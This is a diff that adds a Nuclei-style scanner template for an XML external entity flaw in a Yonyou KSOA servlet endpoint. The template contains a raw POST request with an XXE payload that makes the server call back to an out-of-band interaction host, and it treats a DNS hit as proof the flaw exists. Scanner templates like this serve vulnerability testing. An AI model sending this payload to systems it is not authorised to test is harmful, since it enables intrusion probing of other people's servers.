@@ -1,0 +1,25 @@
+
+id: yonyou-KSOA-com-sksoft-common-portal-XXE
+
+info:
+  name: msk-template
+  author: msk
+  severity: high
+
+http:
+  - raw:
+      - |
+        POST /servlet/com.sksoft.common.portal.SpacePreview HTTP/1.1
+        Host: {{Hostname}}
+        Accept-Encoding: gzip
+        Connection: close
+        Content-Type: text/xml
+        User-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.2309.372 Safari/537.36
+
+        <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://{{interactsh-url}}"> ]><foo>&xxe;</foo>
+
+    matchers:
+      - type: word
+        part: interactsh_protocol # Confirms the DNS Interaction
+        words:
+          - "dns"
